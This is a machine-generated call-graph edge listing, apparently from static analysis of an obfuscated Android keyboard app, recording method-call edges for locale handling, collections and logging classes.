VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
CLINIT edge: staticinvoke <lqs: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lqs: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
STATIC edge: $l1 = staticinvoke <java.lang.System: long nanoTime()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.lang.System: long nanoTime()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkg: void <init>(int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r12 = virtualinvoke $r6.<lkt: lkx l()>() in <lmb: lme f()> ==> <lkt: lkx l()>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lsg: void <init>()> ==> <lsv: void <init>()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
SPECIAL edge: specialinvoke $r1.<lvs: void <init>(java.lang.String,int)>("STRING", 1) in <lvs: void <clinit>()> ==> <lvs: void <init>(java.lang.String,int)>
VIRTUAL edge: $i0 = virtualinvoke $r5.<java.lang.String: int length()>() in <ivw: java.lang.String p()> ==> <java.lang.String: int length()>
VIRTUAL edge: $z0 = virtualinvoke r0.<nzh: boolean e()>() in <nzh: boolean f(ivv)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r3.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: java.util.Map$Entry d(java.lang.String,int)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: int b()> ==> <ljf: boolean m()>
STATIC edge: $r0 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r15.<lvr: void <init>(lvr,lvr)>($r16, $r17) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvr: void <init>(lvr,lvr)>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: int[] r()>() in <ljf: void l(int)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
STATIC edge: $i4 = staticinvoke <izw: int ag(int,int,int)>($i2, $i1, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <ivw: boolean A(char)>($c3) in <nzh: boolean f(ivv)> ==> <ivw: boolean A(char)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(hff,java.lang.Class,ldp)>($r18, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(hff,java.lang.Class,ldp)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
STATIC edge: $r6 = staticinvoke <lqq: lqq a(int,java.lang.Object[])>(4, $r9) in <lkx: lkx o(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lqq: lqq a(int,java.lang.Object[])>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <lvm: java.lang.Object g(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(10) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke r0.<lkh: int b(java.lang.Object[],int)>($r1, 0) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int b(java.lang.Object[],int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: specialinvoke $r6.<ltc: void <init>(java.lang.String,int,int)>("NONE", 4, 0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int c()> ==> <java.lang.UnsupportedOperationException: void <init>()>
SPECIAL edge: $z0 = specialinvoke r0.<lsn: boolean ac()>() in <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)> ==> <lsn: boolean ac()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>($r3, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Language tag type is set to ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(boolean[],boolean[])>($r18, $r19) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(boolean[],boolean[])>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int b(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int b(java.lang.Class)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lje: boolean hasNext()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r5, $i6, $i1) in <ljf: boolean add(java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljf: java.lang.Object[] s()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <java.util.HashSet: int size()>
SPECIAL edge: specialinvoke $r2.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: boolean add(java.lang.Object)> ==> <java.lang.UnsupportedOperationException: void <init>()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <ljf: void q(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke $r23.<mag: void <init>(java.lang.String,int,int)>("PLAYSTORE_STICKER_IMAGE", 23, 23) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.LinkageError: void <init>()>() in <java.lang.ExceptionInInitializerError: void <init>(java.lang.String)> ==> <java.lang.LinkageError: void <init>()>
SPECIAL edge: specialinvoke r0.<lka: void <init>()>() in <mii: void <init>()> ==> <lka: void <init>()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lfc: void <init>(lfa)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r2) in <ivv: ivw a()> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r11.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_METADATA", 11, 11) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<ljd: int size()>() in <ljb: void a()> ==> <ljd: int size()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("iw", "he") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <ljf: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lwa: void <init>()>() in <lwa: void <clinit>()> ==> <lwa: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <ljf: java.lang.Object[] toArray()>
CLINIT edge: staticinvoke <hbu: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <hbu: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<lql: void <init>(java.lang.Object[],int)>($r1, 0) in <lql: void <clinit>()> ==> <lql: void <init>(java.lang.Object[],int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("in", "id") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashMap: void <init>(int,float)>($i0, 1.0F) in <ljd: java.util.Map n(int)> ==> <java.util.LinkedHashMap: void <init>(int,float)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>($r0, $r1, $i0, $r2) in <lsq: lsq e(java.lang.String,java.lang.String,int,java.lang.String)> ==> <lsp: void <init>(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke r0.<j$.util.concurrent.ConcurrentHashMap: long l()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ConcurrentHashMap: long l()>
CLINIT edge: staticinvoke <idq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <idq: void <clinit>()>
VIRTUAL edge: $z2 = virtualinvoke $r9.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l6, $i2, $i7) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r3 = staticinvoke <iwt: java.lang.String c(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <iwt: java.lang.String c(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.UnsupportedOperationException: void <init>()>() in <lkh: int j()> ==> <java.lang.UnsupportedOperationException: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r0.<java.util.List: boolean isEmpty()>() in <ivw: java.lang.String[] Q(java.util.List)> ==> <java.util.ArrayList: boolean isEmpty()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c2) in <ivw: boolean v(java.lang.String)> ==> <ivw: boolean u(char)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(0) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r3.<java.lang.AssertionError: void <init>(java.lang.Object)>($r1) in <lvs: lvs a(java.lang.Object)> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(10) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lmc: lsa l()>
SPECIAL edge: specialinvoke $r2.<lfc: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfc: void <init>(lfa)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lly: void j(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>("unbounded recursion in log statement", r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
VIRTUAL edge: $i0 = virtualinvoke $r3.<j$.sun.misc.b: int a(java.lang.Class)>(class "[Lj$/util/concurrent/l;") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: int a(java.lang.Class)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<lkt: void e(int)>($i0) in <lkt: void a(java.lang.Object,java.lang.Object)> ==> <lkt: void e(int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
STATIC edge: $r7 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r6) in <lma: lma w(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object[])> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: specialinvoke $r4.<j$.util.concurrent.v: void <init>()>() in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <j$.util.concurrent.v: void <init>()>
SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
